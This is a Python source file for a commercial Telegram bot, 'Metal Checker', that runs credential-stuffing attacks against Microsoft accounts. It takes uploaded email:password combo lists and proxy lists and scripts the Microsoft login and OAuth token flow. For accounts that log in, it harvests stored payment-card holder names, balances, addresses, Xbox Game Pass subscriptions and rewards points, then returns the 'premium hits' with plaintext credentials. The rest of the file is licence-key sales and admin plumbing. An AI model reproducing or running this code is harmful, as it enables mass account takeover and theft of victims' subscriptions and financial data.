# -*- coding: utf-8 -*-
"""
Metal Checker — Automated Account Verification Infrastructure
Developer: Icardi
Powered by: Metal Drops
"""

import os
import sys
import time
import uuid
import re
import json
import logging
import threading
import configparser
import concurrent.futures
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote
import requests
import telebot
from telebot import types

# Setup fundamental logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ══════════════════════════════════════════════════════════════════════
#  ENVIRONMENT CONFIGURATION & INITIALIZATION
# ══════════════════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = os.getenv("CHAT_ID", "")

if not BOT_TOKEN or not OWNER_ID:
    print("[-] Error: BOT_TOKEN and CHAT_ID environment variables must be set!")
    sys.exit(1)

try:
    OWNER_ID = int(OWNER_ID)
except ValueError:
    print("[-] Error: CHAT_ID variable must be a valid integer user ID!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# Database Engine File Path
DB_FILE = "metal_drops_database.json"

# Dynamic System Settings & Database Archetype
db = {
    "owner": OWNER_ID,
    "admins": [OWNER_ID],
    "keys": {},          # Format: {"KEY-XYZ": {"duration": str, "days": int, "used_by": int/None}}
    "users": {},         # Format: {"USER_ID": {"username": str, "expires_at": str, "registration": str}}
    "channels": [],      # Format: ["@channel1", "@channel2"]
    "settings": {
        "threads": "10",
        "debug": "false",
        "proxy_type": "http",
        "delay": "0.8"
    }
}

db_lock = threading.Lock()

def load_database():
    global db
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                loaded_data = json.load(f)
                with db_lock:
                    if "admins" in loaded_data:
                        if OWNER_ID not in loaded_data["admins"]:
                            loaded_data["admins"].append(OWNER_ID)
                    db.update(loaded_data)
        except Exception as e:
            logging.error(f"Error reading database file: {e}")

def save_database():
    with db_lock:
        try:
            with open(DB_FILE, "w", encoding="utf-8") as f:
                json.dump(db, f, indent=4, ensure_ascii=False)
        except Exception as e:
            logging.error(f"Error writing to database file: {e}")

# Perform persistent sync
load_database()
save_database()

# ══════════════════════════════════════════════════════════════════════
#  XBOX CHECKER CORE CORE (Birebir "main_2.py" Mantığı Korundu)
# ══════════════════════════════════════════════════════════════════════
class MetalDropsEngine:
    def __init__(self, debug=False, proxy=None):
        self.debug = debug
        self.proxy = proxy

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            rd = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            rem = (rd - datetime.now(rd.tzinfo)).days
            return str(rem)
        except:
            return "0"

    def check(self, email: str, password: str) -> dict:
        try:
            session = requests.Session()
            if self.proxy:
                session.proxies.update(self.proxy)

            cid_val = str(uuid.uuid4())

            # ── Step 1: IDP ──────────────────────────────────────
            r1 = session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={
                    "X-OneAuth-AppName": "Outlook Lite",
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                    "X-CorrelationId": cid_val,
                },
                timeout=15,
            )
            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]):
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}

            # ── Step 2: OAuth ─────────────────────────────────────
            time.sleep(0.3)
            oauth_url = (
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_info=1&haschrome=1&login_hint=" + email +
                "&mkt=en&response_type=code"
                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = session.get(oauth_url,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                             allow_redirects=True, timeout=15)

            url_m = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_m = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_m or not ppft_m:
                return {"status": "BAD", "data": {}}

            post_url = url_m.group(1).replace("\\/", "/")
            ppft = ppft_m.group(1)

            # ── Step 3: Login POST ────────────────────────────────
            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}"
                f"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                f"&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                f"&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0"
                f"&isRecoveryAttemptPost=0&i19=9960"
            )
            r3 = session.post(post_url, data=login_data,
                              headers={
                                  "Content-Type": "application/x-www-form-urlencoded",
                                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                  "Origin": "https://login.live.com",
                                  "Referer": r2.url,
                              },
                              allow_redirects=False, timeout=15)

            if "account or password is incorrect" in r3.text:
                return {"status": "BAD", "data": {}}
            if r3.text.count("error") > 3:
                return {"status": "BAD", "data": {}}
            if "identity/confirm" in r3.text:
                return {"status": "2FA", "data": {}}
            if "Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_m = re.search(r'code=([^&]+)', location)
            if not code_m:
                return {"status": "BAD", "data": {}}
            code = code_m.group(1)

            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()

            # ── Step 4: Token ────────────────────────────────────
            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=(
                    f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                    f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    f"&grant_type=authorization_code&code={code}"
                    f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                ),
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=15,
            )
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            access_token = r4.json()["access_token"]

            # ── Step 5: Profil ───────────────────────────────────
            profile_hdrs = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            country = ""
            name = ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers=profile_hdrs, timeout=15)
                if r5.status_code == 200:
                    p = r5.json()
                    loc = p.get("location", "")
                    if isinstance(loc, str):
                        country = loc.split(',')[-1].strip()
                    elif isinstance(loc, dict):
                        country = loc.get("country", "")
                    name = p.get("displayName", "")
            except Exception:
                pass

            # ── Step 6: Payment token ────────────────────────────
            time.sleep(0.3)
            state_json = json.dumps({"userId": str(uuid.uuid4()).replace('-','')[:16], "scopeSet": "pidl"})
            pay_auth_url = (
                "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
                "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                f"&state={quote(state_json)}&prompt=none"
            )
            r6 = session.get(pay_auth_url,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                      "Referer": "https://account.microsoft.com/"},
                             allow_redirects=True, timeout=20)

            payment_token = None
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, r6.text + " " + r6.url)
                if m:
                    payment_token = unquote(m.group(1))
                    break

            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}

            # ── Step 7: Payment instruments ──────────────────────
            pay_data = {"country": country, "name": name}
            sub_data = {}
            pay_hdrs = {
                "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept":        "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type":  "application/json",
                "Host":          "paymentinstruments.mp.microsoft.com",
                "ms-cV":         str(uuid.uuid4()),
                "Origin":        "https://account.microsoft.com",
                "Referer":       "https://account.microsoft.com/",
            }
            try:
                r7 = session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
                    headers=pay_hdrs, timeout=15)
                if r7.status_code == 200:
                    bal_m = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if bal_m: pay_data["balance"] = "$" + bal_m.group(1)
                    card_m = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_m: pay_data["card_holder"] = card_m.group(1)
                    if not country:
                        ctry_m = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if ctry_m: pay_data["country"] = ctry_m.group(1)
                    zip_m = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_m: pay_data["zipcode"] = zip_m.group(1)
                    city_m = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_m: pay_data["city"] = city_m.group(1)
            except Exception:
                pass

            # Bing Rewards
            try:
                rew_r = session.get("https://rewards.bing.com/", timeout=10)
                pts_m = re.search(r'"availablePoints"\s*:\s*(\d+)', rew_r.text)
                if pts_m: pay_data["rewards_points"] = pts_m.group(1)
            except Exception:
                pass

            # ── Step 8: Subscription ────────────────────────────
            try:
                r8 = session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                    headers=pay_hdrs, timeout=15)
                if r8.status_code == 200:
                    txt = r8.text
                    plans = {
                        "Xbox Game Pass Ultimate": "GAME PASS ULTIMATE",
                        "PC Game Pass":            "PC GAME PASS",
                        "EA Play":                 "EA PLAY",
                        "Xbox Live Gold":          "XBOX LIVE GOLD",
                        "Game Pass":               "GAME PASS",
                    }
                    found_plan = None
                    for kw, label in plans.items():
                        if kw in txt:
                            found_plan = label; break

                    if found_plan:
                        t_m = re.search(r'"title"\s*:\s*"([^"]+)"', txt)
                        if t_m:  sub_data["title"] = t_m.group(1)
                        s_m = re.search(r'"startDate"\s*:\s*"([^T"]+)', txt)
                        if s_m:  sub_data["start_date"] = s_m.group(1)
                        ren_m = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', txt)
                        if ren_m:
                            rd = ren_m.group(1)
                            sub_data["renewal_date"]   = rd
                            sub_data["days_remaining"] = self.get_remaining_days(rd + "T00:00:00Z")
                        ar_m = re.search(r'"autoRenew"\s*:\s*(true|false)', txt)
                        if ar_m: sub_data["auto_renew"] = "YES" if ar_m.group(1) == "true" else "NO"
                        am_m = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', txt)
                        if am_m: sub_data["total_amount"] = am_m.group(1)
                        cu_m = re.search(r'"currency"\s*:\s*"([^"]+)"', txt)
                        if cu_m: sub_data["currency"] = cu_m.group(1)
                        if not pay_data.get("country"):
                            c2_m = re.search(r'"country"\s*:\s*"([^"]+)"', txt)
                            if c2_m: pay_data["country"] = c2_m.group(1)

                        sub_data["premium_type"] = found_plan
                        sub_data["has_premium"]  = True
                        days = sub_data.get("days_remaining", "0")
                        if days.startswith("-"):
                            return {"status": "EXPIRED", "data": {**pay_data, **sub_data}}
                        return {"status": "PREMIUM", "data": {**pay_data, **sub_data}}
                    else:
                        return {"status": "FREE", "data": pay_data}
            except Exception:
                return {"status": "FREE", "data": pay_data}

            return {"status": "FREE", "data": {**pay_data, **sub_data}}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": {}}
        except Exception:
            return {"status": "BAD", "data": {}}

# ══════════════════════════════════════════════════════════════════════
#  SECURITY PERMISSION & SYSTEM GATEKEEPERS
# ══════════════════════════════════════════════════════════════════════
def check_user_access(user_id: int) -> bool:
    if user_id in db["admins"] or user_id == OWNER_ID:
        return True
    uid_str = str(user_id)
    if uid_str in db["users"]:
        expiry_str = db["users"][uid_str]["expires_at"]
        if expiry_str == "infinite":
            return True
        try:
            expiry_date = datetime.fromisoformat(expiry_str)
            if datetime.now() < expiry_date:
                return True
        except ValueError:
            pass
    return False

def get_remaining_days_string(user_id: int) -> str:
    uid_str = str(user_id)
    if user_id == OWNER_ID:
        return "Icardi System Founder"
    if user_id in db["admins"]:
        return "Metal Drops Administrator"
    if uid_str in db["users"]:
        expiry_str = db["users"][uid_str]["expires_at"]
        if expiry_str == "infinite":
            return "Lifetime Plan"
        try:
            expiry_date = datetime.fromisoformat(expiry_str)
            delta = expiry_date - datetime.now()
            if delta.days >= 0:
                return f"{delta.days} days remaining"
            return "Expired License"
        except ValueError:
            return "Unknown Configuration"
    return "No Active Key"

def check_mandatory_channels(user_id: int) -> list:
    unjoined = []
    if user_id == OWNER_ID or user_id in db["admins"]:
        return unjoined
    for ch in db["channels"]:
        try:
            chat_member = bot.get_chat_member(ch, user_id)
            if chat_member.status in ["left", "kicked", "left_chat"]:
                unjoined.append(ch)
        except Exception:
            unjoined.append(ch)
    return unjoined

# ══════════════════════════════════════════════════════════════════════
#  DYNAMIC CONTROL INTERFACE KEYBOARDS (TELEGRAM UI)
# ══════════════════════════════════════════════════════════════════════
def build_main_dashboard(user_id: int):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    btn_scan = types.KeyboardButton("🚀 Start Metal Checker")
    btn_key = types.KeyboardButton("🔑 Redeem Access Key")
    btn_status = types.KeyboardButton("📊 Account Subscription Status")
    markup.add(btn_scan, btn_key)
    markup.add(btn_status)
    if user_id in db["admins"] or user_id == OWNER_ID:
        btn_admin = types.KeyboardButton("⚙️ Admin Control Board")
        markup.add(btn_admin)
    return markup

def build_admin_inline_panel():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🆕 Generate License Key", callback_data="cb_adm_gen"),
        types.InlineKeyboardButton("📋 Active Key Database", callback_data="cb_adm_list"),
        types.InlineKeyboardButton("❌ Revoke User Subscription", callback_data="cb_adm_revoke"),
        types.InlineKeyboardButton("📢 Broadcast Alert", callback_data="cb_adm_bcast"),
        types.InlineKeyboardButton("🌐 Forced Channels Management", callback_data="cb_adm_channels"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="cb_adm_settings"),
        types.InlineKeyboardButton("👤 Manage Admin Roles", callback_data="cb_adm_roles")
    )
    return markup

# ══════════════════════════════════════════════════════════════════════
#  USER INTAKE & SYSTEM INTERACTION HANDLERS
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start', 'help'])
def command_start_dispatcher(message):
    uid = message.from_user.id
    welcome_msg = (
        f"🙋‍♂️ *Welcome to Metal Checker!*\n\n"
        f"⚡ Operational Architecture: *Metal Drops*\n"
        f"👨‍💻 System Architect: *Icardi*\n\n"
        f"Please unlock your operational profile parameters using the structural buttons below."
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=build_main_dashboard(uid))

@bot.message_handler(func=lambda m: m.text == "📊 Account Subscription Status")
def user_status_inquiry_handler(message):
    uid = message.from_user.id
    rem = get_remaining_days_string(uid)
    status_msg = (
        f"🛡️ *Metal Checker Account Integrity Board*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Your Telegram ID:* `{uid}`\n"
        f"⏳ *License Standing:* `{rem}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Powered and structured by *Metal Drops* protocols."
    )
    bot.send_message(message.chat.id, status_msg)

@bot.message_handler(func=lambda m: m.text == "🔑 Redeem Access Key")
def key_redemption_initialization(message):
    prompt = bot.send_message(message.chat.id, "🔑 *Please submit your structural license validation code below:*")
    bot.register_next_step_handler(prompt, key_redemption_validation_processor)

def key_redemption_validation_processor(message):
    uid = message.from_user.id
    uid_str = str(uid)
    input_token = message.text.strip() if message.text else ""

    with db_lock:
        if input_token in db["keys"]:
            key_data = db["keys"][input_token]
            if key_data["used_by"] is not None:
                bot.send_message(message.chat.id, "❌ This security token tracking code has already been redeemed.")
                return

            days = key_data["days"]
            target_expiry = "infinite" if days == -1 else (datetime.now() + timedelta(days=days)).isoformat()

            key_data["used_by"] = uid
            db["users"][uid_str] = {
                "username": f"@{message.from_user.username}" if message.from_user.username else f"User_{uid}",
                "expires_at": target_expiry,
                "registration": datetime.now().isoformat()
            }
            save_database()

            bot.send_message(
                message.chat.id, 
                f"✅ *License Validated!*\n"
                f"🎁 Plan Granted: `{key_data['duration']}`\n"
                f"Welcome to the *Metal Drops* automated framework.",
                reply_markup=build_main_dashboard(uid)
            )
            return

    bot.send_message(message.chat.id, "❌ Invalid key sequence identifier. Request terminated.")

# ══════════════════════════════════════════════════════════════════════
#  CORE ENGINE DISPATCH MATRIX
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "🚀 Start Metal Checker")
def execution_submission_flow_gateway(message):
    uid = message.from_user.id
    if not check_user_access(uid):
        bot.send_message(message.chat.id, "❌ *Access Denied:* No active authorization profile or valid key registry detected.")
        return

    unjoined = check_mandatory_channels(uid)
    if unjoined:
        ch_list = "\n".join([f"🔗 {c}" for c in unjoined])
        bot.send_message(message.chat.id, f"⚠️ *Channel Enforcement Alert:*\nYou must join the following monitoring channels before performing actions:\n\n{ch_list}")
        return

    prompt = bot.send_message(message.chat.id, "📂 *Please upload your combo accounts data text file (.txt format arranged as email:password):*")
    bot.register_next_step_handler(prompt, combo_file_parsing_intake_handler)

def combo_file_parsing_intake_handler(message):
    if not message.document:
        bot.send_message(message.chat.id, "❌ Operational Error: Expected text document payload structure.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_bytes = bot.download_file(file_info.file_path)
        content_str = downloaded_bytes.decode("utf-8", errors="ignore")
        
        parsed_combos = []
        for line in content_str.splitlines():
            line_clean = line.strip()
            if ":" in line_clean and len(line_clean) > 5:
                parsed_combos.append(line_clean)

        if not parsed_combos:
            bot.send_message(message.chat.id, "❌ Extraction Failure: No valid `email:password` credentials detected inside file body.")
            return

        next_prompt = bot.send_message(
            message.chat.id, 
            f"📝 Identified `{len(parsed_combos)}` raw entries.\n\n"
            f"Now upload your proxies document file (`.txt`) or reply with *none* to use direct unproxied routes:"
        )
        bot.register_next_step_handler(next_prompt, lambda msg: proxy_intake_and_launch_handler(msg, parsed_combos))

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Stream Parsing Exception: {e}")

def proxy_intake_and_launch_handler(message, combos):
    proxy_list = []
    if message.text and message.text.lower().strip() == "none":
        pass
    elif message.document:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_bytes = bot.download_file(file_info.file_path)
            proxy_list = [l.strip() for l in downloaded_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip()]
        except Exception:
            bot.send_message(message.chat.id, "⚠️ Proxy list extraction warning. Operating via unproxied parameters.")

    status_display = bot.send_message(message.chat.id, "⏳ *Activating Metal Drops Thread Mapping Controllers...*")
    
    threading.Thread(
        target=asynchronous_execution_monitor_loop,
        args=(message.chat.id, status_display.message_id, combos, proxy_list),
        daemon=True
    ).start()

def asynchronous_execution_monitor_loop(chat_id, status_msg_id, combos, proxies):
    total_count = len(combos)
    metrics = {"checked": 0, "premium": 0, "free": 0, "2fa": 0, "bad": 0}
    premium_hits_list = []
    
    cfg_threads = int(db["settings"].get("threads", "10"))
    cfg_delay = float(db["settings"].get("delay", "0.8"))
    cfg_proxy_type = db["settings"].get("proxy_type", "http")

    last_ui_sync_time = time.time()
    sync_lock = threading.Lock()

    def validation_worker_thread(credential_string):
        nonlocal last_ui_sync_time
        try:
            email_part, password_part = credential_string.split(":", 1)
            email_part = email_part.strip(); password_part = password_part.strip()
        except Exception:
            with sync_lock:
                metrics["bad"] += 1; metrics["checked"] += 1
            return

        allocated_proxy = None
        if proxies:
            with sync_lock:
                idx = metrics["checked"] % len(proxies)
            target_line = proxies[idx]
            url = f"{cfg_proxy_type}://{target_line}"
            allocated_proxy = {"http": url, "https": url}

        checker_instance = MetalDropsEngine(debug=False, proxy=allocated_proxy)
        runtime_outcome = checker_instance.check(email_part, password_part)
        status_key = runtime_outcome.get("status", "BAD")
        data = runtime_outcome.get("data", {})

        with sync_lock:
            if status_key == "PREMIUM":
                metrics["premium"] += 1
                premium_hits_list.append(
                    f"Account: {email_part}:{password_part} | Plan: {data.get('premium_type', 'PREMIUM')} | Country: {data.get('country', 'N/A')} | Days: {data.get('days_remaining', '0')} | Balance: {data.get('balance', 'N/A')}"
                )
                hit_details = (
                    f"🟩 *METAL DROPS PREMIUM HIT FOUND!*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📧 *Account:* `{email_part}:{password_part}`\n"
                    f"💎 *Plan:* `{data.get('premium_type', 'PREMIUM')}`\n"
                    f"🌍 *Country:* `{data.get('country', 'N/A')}`\n"
                    f"📅 *Remaining Days:* `{data.get('days_remaining', '0')} days`\n"
                    f"💳 *Card:* `{data.get('card_holder', 'N/A')}`\n"
                    f"💰 *Balance:* `{data.get('balance', 'N/A')}`\n"
                    f"⭐ *Points:* `{data.get('rewards_points', '0')}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"👨‍💻 Developer: *Icardi*"
                )
                bot.send_message(chat_id, hit_details)
            elif status_key == "FREE":
                metrics["free"] += 1
            elif status_key == "2FA":
                metrics["2fa"] += 1
            else:
                metrics["bad"] += 1
            
            metrics["checked"] += 1

            current_time = time.time()
            if current_time - last_ui_sync_time >= 5.0:
                last_ui_sync_time = current_time
                trigger_interface_refresh(chat_id, status_msg_id, metrics, total_count, finalized=False)
        
        if cfg_delay > 0:
            time.sleep(cfg_delay)

    with concurrent.futures.ThreadPoolExecutor(max_workers=cfg_threads) as pool:
        pool.map(validation_worker_thread, combos)

    trigger_interface_refresh(chat_id, status_msg_id, metrics, total_count, finalized=True)

    # Output premium hits file schema injection
    if premium_hits_list:
        file_path = "premium_hits.txt"
        try:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(premium_hits_list))
            with open(file_path, "rb") as doc:
                bot.send_document(chat_id, doc, caption="🟩 *Metal Checker Task Completed! Here is your premium hits file.*")
            os.remove(file_path)
        except Exception as e:
            bot.send_message(chat_id, f"⚠️ Error sending document output layout: {e}")
    else:
        bot.send_message(chat_id, "ℹ️ Task completed. No premium profiles discovered to output.")

def trigger_interface_refresh(chat_id, msg_id, data, total, finalized=False):
    header = "🏁 *Metal Checker Task Finalized*" if finalized else "🔄 *Metal Drops Pipeline Live Status*"
    ratio = data["checked"] / max(total, 1)
    bar = "🟩" * int(ratio * 12) + "⬜" * (12 - int(ratio * 12))

    ui_render_text = (
        f"{header}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Premium: `{data['premium']}`\n"
        f"🆓 Free: `{data['free']}`\n"
        f"⚠️ 2FA: `{data['2fa']}`\n"
        f"❌ Bad: `{data['bad']}`\n\n"
        f"📊 Progress: `{data['checked']}` / `{total}`\n"
        f"{bar} [ {ratio*100:.1f}% ]\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Developer Status: *Icardi*"
    )
    try:
        bot.edit_message_text(ui_render_text, chat_id, msg_id)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════
#  CENTRAL CONTROL COMMAND CENTER INTERFACE (ADMIN PANEL)
# ══════════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text == "⚙️ Admin Control Board")
def administrative_entry_gatekeeper(message):
    uid = message.from_user.id
    if uid not in db["admins"] and uid != OWNER_ID: return
    
    bot.send_message(
        message.chat.id,
        "🛠️ *Metal Checker Central Command Infrastructure*\n"
        "Welcome back Admin. Select structural variables to configure below:",
        reply_markup=build_admin_inline_panel()
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("cb_adm_"))
def admin_callback_navigation_dispatcher(call):
    uid = call.from_user.id
    if uid not in db["admins"] and uid != OWNER_ID: return

    action = call.data

    if action == "cb_adm_gen":
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("1 Day", callback_data="cb_gen_1"),
            types.InlineKeyboardButton("3 Days", callback_data="cb_gen_3"),
            types.InlineKeyboardButton("1 Week", callback_data="cb_gen_7"),
            types.InlineKeyboardButton("1 Month", callback_data="cb_gen_30"),
            types.InlineKeyboardButton("3 Months", callback_data="cb_gen_90"),
            types.InlineKeyboardButton("Infinite", callback_data="cb_gen_inf"),
            types.InlineKeyboardButton("Custom Range Specifier", callback_data="cb_gen_custom")
        )
        bot.edit_message_text("⏱️ Select license token active timeline frame:", call.message.chat.id, call.message.message_id, reply_markup=kb)

    elif action == "cb_adm_list":
        with db_lock:
            if not db["users"]:
                report = "📋 *Active License Database Table Records:*\n\nNo premium users active."
            else:
                report = "📋 *Active License Database Table Records:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                for target_uid, meta in db["users"].items():
                    report += f"👤 User: {meta['username']} (`{target_uid}`)\n⏳ Remaining: `{meta['expires_at']}`\n\n"
        bot.edit_message_text(report, call.message.chat.id, call.message.message_id)

    elif action == "cb_adm_revoke":
        prompt = bot.send_message(call.message.chat.id, "❌ Input target *User ID* to permanently purge license standing:")
        bot.register_next_step_handler(prompt, process_administrative_subscription_strip)

    elif action == "cb_adm_bcast":
        prompt = bot.send_message(call.message.chat.id, "📢 Send message text layout pattern to broadcast across all clients:")
        bot.register_next_step_handler(prompt, process_administrative_broadcast_emission)

    elif action == "cb_adm_channels":
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("➕ Add Forced Channel", callback_data="cb_ch_add"),
            types.InlineKeyboardButton("🗑️ Clear Forced Channels", callback_data="cb_ch_clear"),
            types.InlineKeyboardButton("📋 Display Forced Channels", callback_data="cb_ch_view")
        )
        bot.edit_message_text("🌐 *Forced Enforcement Channels Control Module:*", call.message.chat.id, call.message.message_id, reply_markup=kb)

    elif action == "cb_adm_settings":
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("Change Threads Count", callback_data="cb_set_threads")
        )
        s = db["settings"]
        status_text = (
            f"⚙️ *Settings Matrix:*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🧵 Concurrent Thread Execution: `{s['threads']}`"
        )
        bot.edit_message_text(status_text, call.message.chat.id, call.message.message_id, reply_markup=kb)

    elif action == "cb_adm_roles":
        if uid != OWNER_ID:
            bot.answer_callback_query(call.id, "❌ System Founder permissions required.", show_alert=True)
            return
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("➕ Add Admin Privileges", callback_data="cb_role_add"),
            types.InlineKeyboardButton("➖ Remove Admin Privileges", callback_data="cb_role_rem")
        )
        bot.edit_message_text("👤 *Administrative Node Access Controller Engine:*", call.message.chat.id, call.message.message_id, reply_markup=kb)

# ══════════════════════════════════════════════════════════════════════
#  LICENSE LIFE TIMELINE CALLBACK PIPELINES
# ══════════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: call.data.startswith("cb_gen_"))
def license_generation_time_allocation_processor(call):
    uid = call.from_user.id
    if uid not in db["admins"] and uid != OWNER_ID: return

    allocation = call.data.replace("cb_gen_", "").strip()
    if allocation == "custom":
        prompt = bot.send_message(call.message.chat.id, "🔢 Provide custom active range day mapping parameter (integer format):")
        bot.register_next_step_handler(prompt, process_custom_days_generation_input)
        return

    days_map = {"1": 1, "3": 3, "7": 7, "30": 30, "90": 90, "inf": -1}
    label_map = {"1": "1 Day", "3": "3 Days", "7": "1 Week", "30": "1 Month", "90": "3 Months", "inf": "Infinite Lifetime"}

    if allocation not in days_map:
        try:
            bot.answer_callback_query(call.id, "❌ Invalid allocation parameter.")
        except Exception: pass
        return

    target_days = days_map[allocation]
    target_label = label_map[allocation]
    token = f"METAL-{str(uuid.uuid4()).upper()[:16]}"

    try:
        with db_lock:
            if "keys" not in db:
                db["keys"] = {}
            db["keys"][token] = {"duration": target_label, "days": target_days, "used_by": None}
        save_database()

        bot.edit_message_text(
            f"✅ *License Configuration Deployed Matrix:*\n\n"
            f"🔑 *Key Token:* `{token}`\n"
            f"⏱️ *Scope Duration:* `{target_label}`",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown"
        )
        try:
            bot.answer_callback_query(call.id, "✅ Key generated successfully!")
        except Exception: pass
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Key generation failed: {str(e)}")

def process_custom_days_generation_input(message):
    try:
        days = int(message.text.strip())
        if days <= 0: raise ValueError
    except Exception:
        bot.send_message(message.chat.id, "❌ Structural Parsing Failure: Provide a positive integer block value.")
        return

    token = f"METAL-CUSTOM-{str(uuid.uuid4()).upper()[:12]}"
    try:
        with db_lock:
            if "keys" not in db:
                db["keys"] = {}
            db["keys"][token] = {"duration": f"{days} Custom Days", "days": days, "used_by": None}
        save_database()
        bot.send_message(message.chat.id, f"✅ *Custom Token Issued:*\n\n🔑 Key: `{token}`\n⏱️ Frame: `{days} Days`", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Custom key generation failed: {str(e)}")

